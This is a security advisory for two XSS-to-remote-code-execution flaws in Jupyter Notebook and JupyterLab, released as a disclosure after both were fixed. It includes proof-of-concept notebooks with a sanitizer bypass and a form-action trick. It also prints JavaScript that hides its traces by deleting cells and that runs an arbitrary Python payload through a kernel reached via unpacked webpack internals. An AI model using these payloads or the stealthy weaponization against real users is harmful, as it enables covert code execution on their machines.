---
title: 'Jupyter: RCE through XSS in Jupyter Lab and Jupyter Notebook (CVE-2021-32797,
  CVE-2021-32798)'
published: '2021-10-20T16:18:20Z'
severity: High
ghsa_id: GHSA-c469-p3jp-2vhx
cve_id: CVE-2021-32797
weaknesses: []
products:
- ecosystem: pip
  package_name: Jupyter Notebook (notebook) and Jupyter Lab (jupyterlab)
  affected_versions: Jupyter Notebook <6.4.1, <5.7.11. Jupyter Lab <3.1.4, <3.0.17,
    <2.3.2, <2.2.10, <1.2.21
  patched_versions: Jupyter Notebook >=6.4.1, >=5.7.11. Jupyter Lab >=3.1.4, >=3.0.17,
    >=2.3.2, >=2.2.10, >=1.2.21
cvss: null
credits:
- github_user_id: bluec0re
  name: BlueC0re
  avatar: https://avatars.githubusercontent.com/u/638422?s=40&v=4
- github_user_id: 0xDeva
  name: Guillaume Jeanne
  avatar: https://avatars.githubusercontent.com/u/7994379?s=40&v=4
---

### Summary
This document outlines two vulnerabilities in Jupyter Notebook and JupyterLab, found during an internal Security Assessment at Google. Both vulnerabilities are XSS leading to an impact of RCE (Remote Code Execution). The first lies in Jupyter Notebook while the second one is in JupyterLab. They allow to compromise users opening a malicious notebook document. During our assessment, we managed to combine both vulnerabilities into the same notebook document. This document presents a summary, a technical analysis and a minimal proof of concept for each vulnerability. Even if this is not directly related to the vulnerabilities themselves, we also provide (as an FYI) the code used to weaponize a notebook and a write-up about how we did to unpack webpack.

### Severity
**High** - Code Execution through XSS in iPython notebook.

### Proof of Concepts

Save them as .ipynb and open them in the corresponding software.

#### Jupyter Notebook
```json
{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<select><iframe></select><img src=x: onerror=alert('xss')>\n"],
      "text/plain": []
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    ""
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
```

#### Jupyter Lab

```json
{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<label for=buttonid style=\"cursor: text\">not safe to click here</label>\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "highlighter": "codemirror"
   },
   "source": "<div class=\"jp-InputArea-editor\"><div class=\"CodeMirror cm-s-jupyter\"><div class=\"CodeMirror-scroll\"><div class=\"CodeMirror-sizer\"><div style=\"top:0px; position:relative\"><div class=\"CodeMirror-lines\"><div style=\"outline:none; position:relative\"><div class=\"CodeMirror-code\"><div style=\"position: relative\"><label for=buttonid style=\"cursor: text\"><pre class=\"CodeMirror-line\" style=\"background:transparent\"><span style=\"padding-right: 0.1px\"><span class=\"cm-builtin\">print</span>(<span class=\"cm-string\">&quot;Also not safe to click here&quot;</span>)</span></pre></label></div></div></div></div></div></div></div></div></div>"
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "xrender": true
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<form id=jp-mk-edit action='javascript:alert(1)' style='display:none'><button type=submit id=buttonid></form>\n"
      ],
      "text/plain": []
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": ""
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
```

### Further Analysis

#### XSS Due to Caja bypass
 Jupyter Notebook uses a deprecated version of Google Caja to sanitize user inputs. A public Caja bypass (fixed in the last Caja version) can be used to trigger an XSS when a victim opens a malicious ipynb document in Jupyter Notebook. The XSS allows an attacker to execute arbitrary code on the victim computer using Jupyter APIs.

Jupyter Notebook is an open source implementation of the Jupyter backend. Its source code is available on GitHub. To prevent untrusted notebooks from executing arbitrary code when they are opened, it uses Google Caja to sanitize the cells. Caja is a tool for making third party HTML, CSS and JavaScript safe to embed in a website or an application. It is based on a configuration file describing which HTML/JS tags and properties are allowed. Caja was deprecated on January 31st, 2021, and since then does not receive new features or security patches.

![image](https://user-images.githubusercontent.com/33089/138129626-be464eaa-ee0d-40a9-8a03-3eb7a1ef2c78.png)

Caja is confused by the start of an iframe encapsulated in a select tag. The resulting AST does not correctly represent this HTML code which leads to the `<img>` attributes not being sanitized. As a result it executes the onerror callback when the image loads (because the src is invalid). We can also use a valid source image by changing onerror to onload.

We tried the snippet on the latest version of Google Caja and it didn’t work, the vulnerability was patched. However when we tried to include this in our Jupyter document, the javascript was executed when the notebook was opened. To hide it, we created a cell at the end of the notebook:

```json
  {
  "cell_type": "code",
  "execution_count": 0,
  "metadata": {},
  "outputs": [
   {
    "data": {
     "text/html": [
      "<select><iframe></select><img src=x: onerror=alert('xss')>\n"],
     "text/plain": []
    },
    "metadata": {},
    "output_type": "display_data"
   }
  ],
  "source": [
   ""
  ]
 }
```

Once the XSS is triggered, the Javascript code can make use of the Jupyter API to execute arbitrary code on the victim’s computer. To make the attack stealthier, it can also delete the malicious cell and write back the file to disk. For information, he is the Javascript payload we used to weaponize the vulnerability during our Security Assessment.

```javascript
  var timerId = setInterval(function() {
   if (!Jupyter.notebook.kernel) return;
   if (!Jupyter.notebook.kernel.is_connected()) return;

   Jupyter.notebook.delete_cell(LAST_CELL_NB);
   Jupyter.notebook.save_notebook();
   Jupyter.notebook.kernel.execute(python_payload, null, {});
   clearInterval(timerId);
 }, 100);
```

The following code is a minimal ipynb document triggering the vulnerability. To replicate it, a user needs to:
  1. Install jupyter notebook: pip install notebook
  2. Launch it (in the directory contains the PoC file): jupyter notebook
  3. Open the minimal_poc_notebook.ipynb document, the XSS is triggered.

#### XSS due to lack of sanitization of the action attribute of an html `<form>`

JupyterLab doesn’t sanitize the action attribute of html `<form>`. Using html `<label for=”id”>`, it is possible to trigger the form validation outside of the form itself (if the victim clicks on the `<label>`). We developed a script to “labelize” any notebook document, which means it transforms an input notebook into a new one (almost identical when rendered) where every cell (both code or markdown) is wrapped into a `<label>`. If the victim clicks anywhere on the document cells, the XSS is triggered and an arbitrary code can be executed.

Jupyterlab is another open source implementation of the Jupyter framework. It is newer than the Jupyter notebook. To prevent malicious notebooks from executing code upon opening, it uses sanitize-html with a configuration file specifying the allowed or denied HTML tags and attributes and CSS properties.

Among all the filtered attributes, we noticed the action attribute of a `<form>` is not sanitized, so it is possible to include JavaScript code in it. However, to trigger the action attribute, we had to find a way to trigger the form validation and this isn’t possible without an interaction from the victim. It is possible to include a `<button>` with “type=submit” that will validate the form but it seems very unlikely the victim will click on it. We used a trick to be able to virtually click on the button if the victim clicked in another area on the page. It uses the `<label>` HTML tag together with the “for” property:
```html
<form action='javascript:eval(x)'>
   <button type=submit id="buttonid">
</form>
<label for="buttonid">click here</label>
```

Even if the `<label>` is outside of the `<form>`, if the victim clicks on the text “click here”, it will trigger a click on the button, thus triggering the form validation and executing the JavaScript payload. We then developed a script that parses an arbitrary notebook document and transforms every cell (code or markdown) into a markdown cell where the style CSS properties are set accordingly to the previous cell state, in order to render virtually the same. In addition, each text/code is included within a `<label>` tag, as shown below:

```html
<label for="ipynb-autosave" style="cursor: text">{}</label>
```

Our script can be applied to any notebook, for instance if we take this safe notebook:

![image](https://user-images.githubusercontent.com/33089/138130387-1791c438-f458-493f-a20c-c8949a1eb559.png)
After applying our parsing script, the notebook is now backdoored but it renders almost identically:

![image](https://user-images.githubusercontent.com/33089/138130408-27a546b7-e047-4993-869b-2ab19af2bede.png)

However if the victim clicks somewhere on the text or the code, it will trigger the javascript payload. From there it is possible to execute arbitrary code (see below).

The attached code is a minimal ipynb document triggering the vulnerability. To replicate it, a user needs to:
  1. Install jupyter notebook: pip install jupyterlab
  2. Launch it (in the directory contains the PoC file): jupyter-lab
  3. Open the minimal_poc_lab.ipynb document and click on the document, the XSS is triggered.

#### webpack “unpacking” to expose hidden JupyterLab APIs.

In JupyterLab, the classical notebook APIs (like “notebook.kernel.execute”) are not exposed. While we could have used the REST APIs to execute arbitrary code, we did it the hard way, by unpacking webpack. This part is just included as an FYI, to demonstrate the feasibility of the attack.

We wanted to support the most recents major versions of JupyterLab, version 2 and 3. The main difference is the version of webpack used. The major version can be identified using the global exposed variable:

```javascript
if (window.webpackChunk_jupyterlab_application_top != undefined) {
   jupyter_lab3_trigger();
} else if (window.webpackJsonp != undefined) {
   jupyter_lab2_trigger();
```

To expose the hidden API, we need to recover 4 objects: the resolve function used by webpack to find entries of modules, the JupyterLab application, which is the main javascript class, the KernelManager, allowing to create new kernels and the IDocumentManager, allowing to interact with notebook documents.


To find the resolve function, we can push a new callback object in the webpack main array, when the callback is executed, the resolve function is given in the third argument.

```javascript
function jupyter_lab2_trigger() {
  webpackJsonp.push([
    [], {
      '1337': function(a, b, r) {
        window.r = r; // r is the resolve function
        var resolv = jupyterv2_resolve();
        get_lab(resolv.app)
            .then(lab => get_docmgr(lab, resolv.docm.a))
            .then(get_context)
            .then(remove_cells)
        start_kern(resolv.srv).then(exec_python);
      }
    },
    [[1337, 0]]
  ]);
}
```

For JupyterLab version 3, the idea is similar but the resolve function is the first callback argument:
```javascript
function jupyter_lab3_trigger() {
  window[Object.keys(window).filter(name => name.startsWith('webpack'))[0]]
      .push([
        [], null,
        function(r) {
          window.r = r; // r is the resolve function
          Promise.all([get_app().then(app => get_lab(app())), get_docm()])
              .then(arr => get_docmgr(arr[0], (arr[1])().IDocumentManager))
              .then(get_context)
              .then(remove_cells)
          get_srv().then(k => start_kern(k())).then(exec_python)
        }
      ])
}
```

Once the resolve function is available, the 3 importants objects can be resolved by iterating over the different classes.
```javascript
function jupyterv2_resolve() {
  var app;
  var srv;
  var docm;
  for (var k in r.c) {
    var o = r(k);
    if (o) {
      if (o.hasOwnProperty('JupyterLab'))
        app = o;
      else if (o.hasOwnProperty('KernelManager'))
        srv = o;
      else if (
          o.hasOwnProperty('a') &&
          o.a.name == '@jupyterlab/docmanager:IDocumentManager')
        docm = o;
    }
  }
  return {'app': app, 'srv': srv, 'docm': docm};
}
```

For JupyterLab version 3, the implementation is different but similar:
```javascript
function get_app() {
  var jlapp = r.S['default']['@jupyterlab/application'];
  return jlapp[Object.keys(jlapp)[0]].get();
}

function get_docm() {
  var docm = r.S['default']['@jupyterlab/docmanager'];
  return docm[Object.keys(docm)[0]].get();
}

function get_srv() {
  var srv = r.S['default']['@jupyterlab/services'];
  return srv[Object.keys(srv)[0]].get();
}
```

Once the three objects have been resolved, the last step is to iterate through the open notebook documents to find the right one and apply the function that reverts the cells to their original value.
```javascript
function get_context(docmgr) {
  return docmgr._contexts.find(ctx => {
    let celliter = ctx.model.cells.iter();
    let cell;
    while ((cell = celliter.next()) !== undefined) {
      if (cell.metadata.has(cell_meta_key)) return true;
    }
    return false;
  });
}

function remove_cells(ctx) {
  if (ctx) {
    ctx.model.cells.remove(LAST_CELL_NB);
    markdown2code.forEach((v, k) => {
      var c = ctx.model.contentFactory.createCodeCell({});
      c.value.text = v;
      ctx.model.cells.set(k, c);
    });
    ctx.save();
  }
}
```

The remaining part is to start the kernel and execute the python payload.
```javascript
function start_kern(srv) {
  return (new srv.KernelManager()).startNew({name: 'python'});
}
function exec_python(kernel) {
  kernel.requestExecute({code: python_payload}, true);
}
```

### Timeline
**Date reported**: 20 Jul 2021
**Date fixed**: 5 August 2021
**Date disclosed**: 9 August 2021 https://blog.jupyter.org/cve-2021-32797-and-cve-2021-32798-remote-code-execution-in-jupyterlab-and-jupyter-notebook-a70fae0d3239